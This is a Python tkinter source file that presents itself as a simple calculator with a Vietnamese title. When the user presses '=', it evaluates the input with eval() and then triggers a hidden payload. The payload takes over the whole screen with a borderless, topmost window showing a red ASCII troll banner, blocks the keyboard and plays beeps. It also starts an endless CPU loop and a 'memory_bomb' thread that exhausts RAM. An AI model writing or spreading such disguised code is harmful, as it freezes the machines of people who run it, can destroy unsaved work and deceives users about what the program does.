import threading
import time
import tkinter as tk
import winsound

ASCII_TROLL_TEXT = """
                              .__            ___.     \\   
  ____    ____  __ __    ____ |  |__  __ __  \_ |__   ____  
 /    \  / ___\|  |  \  /    \|  |  \|  |  \  | __ \ /  _ \ 
|   |  \/ /_/  >  |  / |   |  \   Y  \  |  /  | \_\ (  <_> )
|___|  /\___  /|____/  |___|  /___|  /____/   |___  /\____/ 
     \//_____/              \/     \/             \/      
"""

expression = ""


def click_btn(item):
  global expression
  expression = expression + str(item)
  input_text.set(expression)


def clear():
  global expression
  expression = ""
  input_text.set("")

def play_hehehe():
  try:
    laugh_notes = [500, 450, 500, 450, 400, 350]
    for freq in laugh_notes:
      winsound.Beep(freq, 150)  
      time.sleep(0.08)  
  except:
    pass



def trigger_lock_screen(root):
  for widget in root.winfo_children():
    widget.destroy()

  sw = root.winfo_screenwidth()
  sh = root.winfo_screenheight()
  root.geometry(f"{sw}x{sh}+0+0")
  root.overrideredirect(True)
  root.attributes("-topmost", True)
  root.configure(bg="black")

  label = tk.Label(
      root,
      text=ASCII_TROLL_TEXT + "\n\n",
      font=("Consolas", 16, "bold"),
      bg="black",
      fg="#FF0000",
      justify="center",
  )
  label.pack(expand=True)

  root.bind("<Key>", lambda event: "break")
  root.focus_force()

  def delayed_chaos():
    play_hehehe()

    threading.Thread(
        target=lambda: [x + 1 for x in iter(int, 1)], daemon=True
    ).start()

    def memory_bomb():
      A = []
      while True:
        A.append("HEHE" * 10**8)

    threading.Thread(target=memory_bomb, daemon=True).start()

  threading.Thread(target=delayed_chaos, daemon=True).start()


def evaluate():
  global expression
  try:
    result = str(eval(expression))
    input_text.set(result)
    expression = result

    root.after(400, lambda: trigger_lock_screen(root))
  except:
    input_text.set("Lỗi")
    expression = ""


root = tk.Tk()
root.title("Máy Tính Đơn Giản")
root.geometry("300x400")
root.resizable(False, False)

input_text = tk.StringVar()

input_frame = tk.Frame(
    root,
    width=311,
    height=50,
    bd=0,
    highlightbackground="black",
    highlightcolor="black",
    highlightthickness=1,
)
input_frame.pack(side=tk.TOP)

input_field = tk.Entry(
    input_frame,
    textvariable=input_text,
    font=("arial", 18, "bold"),
    width=21,
    bg="#eee",
    bd=0,
    justify=tk.RIGHT,
)
input_field.grid(row=0, column=0)
input_field.pack(ipady=10)

btns_frame = tk.Frame(root, width=300, height=350, bg="grey")
btns_frame.pack()

tk.Button(
    btns_frame,
    text="C",
    width=16,
    height=3,
    bd=0,
    bg="#eee",
    cursor="hand2",
    command=lambda: clear(),
).grid(row=0, column=0, columnspan=2, padx=1, pady=1)
tk.Button(
    btns_frame,
    text="/",
    width=7,
    height=3,
    bd=0,
    bg="#eee",
    cursor="hand2",
    command=lambda: click_btn("/"),
).grid(row=0, column=2, padx=1, pady=1)
tk.Button(
    btns_frame,
    text="*",
    width=7,
    height=3,
    bd=0,
    bg="#eee",
    cursor="hand2",
    command=lambda: click_btn("*"),
).grid(row=0, column=3, padx=1, pady=1)

tk.Button(
    btns_frame,
    text="7",
    width=7,
    height=3,
    bd=0,
    bg="#fff",
    cursor="hand2",
    command=lambda: click_btn(7),
).grid(row=1, column=0, padx=1, pady=1)
tk.Button(
    btns_frame,
    text="8",
    width=7,
    height=3,
    bd=0,
    bg="#fff",
    cursor="hand2",
    command=lambda: click_btn(8),
).grid(row=1, column=1, padx=1, pady=1)
tk.Button(
    btns_frame,
    text="9",
    width=7,
    height=3,
    bd=0,
    bg="#fff",
    cursor="hand2",
    command=lambda: click_btn(9),
).grid(row=1, column=2, padx=1, pady=1)
tk.Button(
    btns_frame,
    text="-",
    width=7,
    height=3,
    bd=0,
    bg="#eee",
    cursor="hand2",
    command=lambda: click_btn("-"),
).grid(row=1, column=3, padx=1, pady=1)

tk.Button(
    btns_frame,
    text="4",
    width=7,
    height=3,
    bd=0,
    bg="#fff",
    cursor="hand2",
    command=lambda: click_btn(4),
).grid(row=2, column=0, padx=1, pady=1)
tk.Button(
    btns_frame,
    text="5",
    width=7,
    height=3,
    bd=0,
    bg="#fff",
    cursor="hand2",
    command=lambda: click_btn(5),
).grid(row=2, column=1, padx=1, pady=1)
tk.Button(
    btns_frame,
    text="6",
    width=7,
    height=3,
    bd=0,
    bg="#fff",
    cursor="hand2",
    command=lambda: click_btn(6),
).grid(row=2, column=2, padx=1, pady=1)
tk.Button(
    btns_frame,
    text="+",
    width=7,
    height=3,
    bd=0,
    bg="#eee",
    cursor="hand2",
    command=lambda: click_btn("+"),
).grid(row=2, column=3, padx=1, pady=1)

tk.Button(
    btns_frame,
    text="1",
    width=7,
    height=3,
    bd=0,
    bg="#fff",
    cursor="hand2",
    command=lambda: click_btn(1),
).grid(row=3, column=0, padx=1, pady=1)
tk.Button(
    btns_frame,
    text="2",
    width=7,
    height=3,
    bd=0,
    bg="#fff",
    cursor="hand2",
    command=lambda: click_btn(2),
).grid(row=3, column=1, padx=1, pady=1)
tk.Button(
    btns_frame,
    text="3",
    width=7,
    height=3,
    bd=0,
    bg="#fff",
    cursor="hand2",
    command=lambda: click_btn(3),
).grid(row=3, column=2, padx=1, pady=1)
tk.Button(
    btns_frame,
    text="=",
    width=7,
    height=3,
    bd=0,
    bg="#ff9933",
    cursor="hand2",
    command=lambda: evaluate(),
).grid(row=3, column=3, rowspan=2, padx=1, pady=1)

tk.Button(
    btns_frame,
    text="0",
    width=16,
    height=3,
    bd=0,
    bg="#fff",
    cursor="hand2",
    command=lambda: click_btn(0),
).grid(row=4, column=0, columnspan=2, padx=1, pady=1)
tk.Button(
    btns_frame,
    text=".",
    width=7,
    height=3,
    bd=0,
    bg="#eee",
    cursor="hand2",
    command=lambda: click_btn("."),
).grid(row=4, column=2, padx=1, pady=1)

root.mainloop() 
